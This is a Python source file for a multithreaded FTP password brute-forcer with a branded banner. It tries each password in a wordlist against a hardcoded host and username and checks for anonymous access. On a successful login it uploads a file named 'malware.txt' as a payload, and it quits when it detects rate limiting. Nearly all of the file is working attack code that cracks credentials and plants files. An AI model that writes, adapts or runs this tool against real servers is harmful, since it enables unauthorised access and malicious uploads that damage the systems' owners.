import concurrent.futures
import ftplib
from ftplib import FTP,FTP_TLS
from tqdm import tqdm
from colorama import Fore
import sys,os,socket,requests
import threading
from anon import anonymous

print(Fore.RED + """
╦  ╦╔═╗╔╗╔╔═╗╔╦╗
╚╗╔╝║╣ ║║║║ ║║║║
 ╚╝ ╚═╝╝╚╝╚═╝╩ ╩ """ + Fore.WHITE + "Multi Threaded FTP Bruteforcer V1.2 Developed By " + "\033[38;5;208mThe Intrusion Team\033[0m" + Fore.RESET)

# Configuration
host = '10.1.1.168'
port = 21
username = 'marlinspike'
password_file = 'Wordlists/default_passwords.txt'
payload = 'malware.txt'
max_workers = 20
response = ""
time = 0

orange = "\033[38;5;208m[*]\033[0m "

print("[" + Fore.RED + "Target" + Fore.RESET + "] " + Fore.WHITE + host + Fore.RESET)
anonymous(host,port)

print("[" + Fore.RED + "Bruteforcing Account" + Fore.RESET + "] " + Fore.WHITE + username + Fore.RESET)
print("[" + Fore.RED + "Password File" + Fore.RESET + "] " + Fore.WHITE + password_file + Fore.RESET)
print("[" + Fore.RED + "Concurrent Workers" + Fore.RESET + "]", Fore.WHITE, max_workers, Fore.RESET)


def ftp_login(host, username, password, login_found):
    global response,time
    try:
        ftp = FTP()
        ftp.connect(host,port=port,timeout=60)
        response = ftp.login(username, password)
        print("[" + Fore.RED + "Password Cracked" + Fore.RESET + "] " + Fore.WHITE + password + Fore.RESET)
        print(Fore.WHITE + "\n[" + Fore.RED + "Exploitation" + Fore.WHITE + "]" + Fore.RESET)
        print(Fore.RED + "   └──=> " + orange + Fore.WHITE + "Uploading File: " + payload + Fore.RESET)
        
        try:
            with open(payload, 'rb') as file:
                ftp.storbinary(f"STOR {payload}", file)
                print(Fore.RED + "   └──=> " + orange + Fore.WHITE + "Upload Successful: " + payload + Fore.RESET)
                ftp.quit()
        except Exception as upload_error:
            print(Fore.RED + "   └──=> " + Fore.RED + "[!] " + Fore.WHITE + f"Upload Failed: {upload_error}" + Fore.RESET)
        
        login_found.set()
        return password
            
    except OSError as OS:
        time += 1
        #print(f"{str(OS)}")
    except ftplib.error_temp:
        response = 'maximum'
    except ftplib.error_perm:
        return None
    except EOFError:
        pass


def update_progress_bar(future, progress_bar):
    progress_bar.update(1)


def multi_threaded_ftp_login(host, username, password_file, max_workers=100):
    passwords = []
    with open(password_file, 'r') as file:
        passwords = [line.strip() for line in file]

    num_passwords = len(passwords)
    print("[" + Fore.RED + "Login Attempts" + Fore.RESET + "]", Fore.WHITE, num_passwords, Fore.RESET)
    progress_bar = tqdm(total=num_passwords, desc='[Bruteforcing]', unit='password(s)')

    login_found = threading.Event()

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for password in passwords:
            future = executor.submit(ftp_login, host, username, password, login_found)
            future.add_done_callback(lambda f: update_progress_bar(f, progress_bar))
            futures.append(future)

        for future in concurrent.futures.as_completed(futures):
            if login_found.is_set():
                break
                      
            password = future.result()
            if password is not None:
                progress_bar.close()
                login_found.set()
                break
            
            # if server responds with timeout ten times display IP/City that is blocked and exit]
            #if time > 10:
            #    ip = requests.get('https://api.ipify.org').text
            #    city = requests.get("https://ipinfo.io/city").text
            #    print("[" + Fore.RED + "Timeout" + Fore.RESET + "]" + " IP Address: " + Fore.RED + ip + Fore.RESET + " blocked by server")
            #    print("[" + Fore.RED + "IP Location" + Fore.RESET + "]" + " City: " + Fore.RED + city.strip("\n") + Fore.RESET )
            #    progress_bar.close()
            #    login_found.set()
            #    break
            
            # if rate limiting detected exit program
            if 'maximum' in response:
                print("[" + Fore.RED + "Rate Limiting Detected" + Fore.RESET + "]" + " Exiting")
                progress_bar.close()
                login_found.set()
                break       

        # Cancel any remaining tasks
        for future in futures:
            future.cancel()

    progress_bar.close()
    if login_found.is_set():
        sys.exit()  # Exit the program
        

if __name__ == '__main__':
    multi_threaded_ftp_login(host, username, password_file, max_workers)

